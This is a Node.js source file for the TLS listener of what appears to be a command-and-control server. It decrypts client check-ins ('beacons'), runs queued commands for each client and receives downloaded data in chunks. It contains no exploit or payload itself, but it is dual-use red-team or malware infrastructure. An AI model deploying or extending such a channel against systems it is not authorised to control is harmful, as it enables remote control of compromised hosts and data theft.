const tls = require('node:tls');
const { readFileSync, existsSync, mkdirSync } = require('node:fs');
const path = require('node:path');
const { logInfo, logError } = require('../modules/logging');
const config = require('../modules/config');
const constants = require('node:constants');

const certPath = path.join(__dirname, `../${config.path.certificates}`);

if (!existsSync(certPath)) {
    mkdirSync(certPath);
}

const certificate = path.join(certPath, config.channels.tls.cert.cert);
const certificatekey = path.join(certPath, config.channels.tls.cert.key);

if (!existsSync(certificate)) {
    throw new Error("Missing certificate.");
}

if (!existsSync(certificatekey)) {
    throw new Error("Missing certificate key.");
}

// Create the TLS server
const server = tls.createServer({
    key: readFileSync(certificatekey),
    cert: readFileSync(certificate),
    sessionTimeout: undefined,
    ciphers: config.channels.tls.ciphers,
    honorCipherOrder: true,
    minVersion: config.channels.tls.version, // Minimum TLS version
    secureOptions: constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION // Disable SSLv2, SSLv3, and compression
}, (socket) => {
    const { getSessionId } = require('../modules/encdec');
    const { addClientSession } = require('../modules/clients');

    const clientAddress = socket.remoteAddress || '1';
    const sessionId = getSessionId(clientAddress);

    // Add client session
    addClientSession(sessionId, socket);

    let clientBuffer = '';

    socket.on('data', async (chunk) => {
        const { upsertClientSession, getClient } = require('../modules/clients');
        const { executeQueuedCommands } = require('../modules/queue');
        const { decryptData } = require('../modules/encdec');
        const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
        
        try {
            const payloadStr = chunk.toString('utf8');
            let client = getClient(sessionId);

            if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
                // Chunk mode
                clientBuffer += payloadStr;
                upsertClientSession(sessionId, { waiting: true, buffer: clientBuffer });
                client = getClient(sessionId);

                if (clientBuffer.includes('--FIN--')) {
                    const bufferChunks = clientBuffer.replace('--FIN--', '');
                    const decrypted = await decryptData(bufferChunks, client.sessionId);
                    const parsed = JSON.parse(decrypted);
                    const response = parsed.response;

                    if (response.download) {
                        await handleDownloadResponse(response);
                    } else {
                        await handleResponse(response);
                    }

                    clientBuffer = '';
                    upsertClientSession(sessionId, { waiting: false, buffer: '' });
                }
            } else {
                // Non-chunk mode
                const decrypted = await decryptData(payloadStr, client.sessionId);
                const parsed = JSON.parse(decrypted);
                const response = parsed.response;

                if (response.beacon) {
                    handleBeacon(response, client);
                    await executeQueuedCommands(client);
                } else if (response.download) {
                    await handleDownloadResponse(response);
                } else if (response.error) {
                    logError(response.error);
                } else {
                    await handleResponse(response);
                }
            }
        } catch (err) {
            logError(err.message);
        }
    });

    socket.on('end', () => {
        const { getClient } = require('../modules/clients');
        const { upsertClientSession } = require('../modules/clients');

        const client = getClient(sessionId);
        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
        upsertClientSession(sessionId, { lastSeen: new Date(), active: false });
    });

    socket.on('error', (err) => {
        const { getClient } = require('../modules/clients');
        const { upsertClientSession } = require('../modules/clients');

        const client = getClient(sessionId);
        logError(`\nClient ${sessionId} threw an error: ${err.message}. IP: ${client.address}`);
        upsertClientSession(sessionId, { active: false });
    });
});

/**
 * Starts listening on the TLS server
 */
const listenTLSServer = () => {
    server.listen(config.channels.tls.port, config.server.host);

    server.on('error', (err) => {
        logError(`\nServer threw an error: ${err.message}`);
        server.close();
    });
};

/**
 * Returns the server instance
 * @returns Server
 */
const getServerInstance = () => {
    return server;
};

/**
 * Closes the TLS server connection
 */
const closeTLSServer = async () => {
    if (server) {
        server.close(() => {
            logInfo('\nServer connection closed');
            server.unref();
        });
    }
};

module.exports = {
    closeTLSServer,
    getServerInstance,
    listenTLSServer
};
